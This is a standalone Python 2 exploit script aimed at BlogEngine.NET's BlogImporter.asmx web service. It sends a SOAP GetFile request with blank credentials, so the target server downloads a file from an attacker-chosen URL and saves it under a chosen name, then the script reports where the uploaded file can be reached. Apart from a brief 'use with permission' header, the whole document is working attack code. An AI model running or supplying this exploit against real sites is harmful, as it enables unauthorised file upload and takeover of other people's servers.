#!/usr/bin/python

# By Jonathan James (jj@areusecure.se)
# Use only with permission and use at your own risk!

import sys
from optparse import OptionParser
from socket import *
def main():
	username = ""
	password = ""
	dest = ""
	usage = "usage: %prog [-t -p -u -d -v] arg"
	parser = OptionParser(usage)
	parser.add_option("-t", "--target", action="store", dest="hostname", help="Hostname of the target")
	parser.add_option("-p", "--port", action="store", dest="port", default="80", help="Port number of the target")
	parser.add_option("-u", "--url", action="store", dest="url", help="URL to download our data from")
	parser.add_option("-d","--dest", action="store", dest="dest", help="Destination filename")
	#parser.add_option("-v","--verbose", dest="verbose", help="Be verbose")
	
	options, remainder = parser.parse_args()

	if options.port:
		server_port = int(options.port)
	else:
		print "[-]	No port specified, defaulting to port 80"
		server_port = 80
		
	if options.url:
		url = options.url
	else:
		parser.error("[!]	You haven't supplied an url to download from. Use -u or --url to do so.")
		exit(1)
		
	if options.dest:
		dest = options.dest
	else:
		last_slash = url.rfind("/") + 1
		while last_slash < len(url):
			dest+=url[last_slash]
			last_slash+=1			
		print "[*]	Destination not provided, defaulting to the name of the source-file: " + dest
		
	if options.hostname:
		hostname = options.hostname
	else:
		parser.error("[!]	You haven't supplied a target hostname. Use -t or --target")
		exit(3)
		
	content_length=""
	total_data=""
	total_size=0
	buffer_size=1024

	xmldata = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <AuthHeader xmlns="http://dotnetblogengine.net/">
      <Username>%s</Username>
      <Password>%s</Password>
    </AuthHeader>
  </soap:Header>
  <soap:Body>
    <GetFile xmlns="http://dotnetblogengine.net/">
      <source>%s</source>
      <destination>%s</destination>
    </GetFile>
  </soap:Body>
</soap:Envelope>""" % (username, password, url, dest)

	envelope = """POST /api/BlogImporter.asmx HTTP/1.1
Host: %s
Content-Type: text/xml; charset=utf-8
Content-Length: %s""" % (hostname,str(len(xmldata)) + '\r\n')
	envelope += 'SOAPAction: "http://dotnetblogengine.net/GetFile"\r\n\r\n'
	envelope += xmldata

	s = socket(AF_INET, SOCK_STREAM)
	s.connect((hostname,server_port))

	s.send(envelope)
	#First receive, get header information
	recv = s.recv(buffer_size)
	#Find first occurance of Content-Length
	content_index = recv.find("Content-Length:")
	#if successul, (-1 is returned if we don't find our string)
	if(content_index > -1):
		content_index += 16
		while(recv[content_index] != '\r'):
			content_length += str(recv[content_index])
			content_index+=1
	else:
		print "[!]	Error, could not find our content-length, quitting!"
		exit(0)

	#content_index + size of the xml-data + 4 bytes for \r\n\r\n
	total_size = int(content_index) + int(content_length) + 4

	#Add first transport of data to our total_data variable
	total_data = recv
	#while the size of total_data is less than the total_size (header + xml-data)
	while (len(total_data) < int(total_size)):
		recv = s.recv(1024)	
		if not recv:
			break
		total_data += recv

	server_ok_index = total_data.rfind("200 OK")
	if(server_ok_index > -1):
		print "[*]	Server returned a 200 OK status - Good!"
	else:
		print "[!]	Something appears to have gone wrong"
		print envelope
		print total_data

	server_getfileresult = total_data.rfind("<GetFileResult>true</GetFileResult>")
	if(server_getfileresult > -1):
		print "[*]	The file seems to be uploaded and should be available at: http://"+hostname+"/"+dest 
	else:
		print envelope + "X" + total_data	
	s.close()

if __name__ == "__main__":
	main()
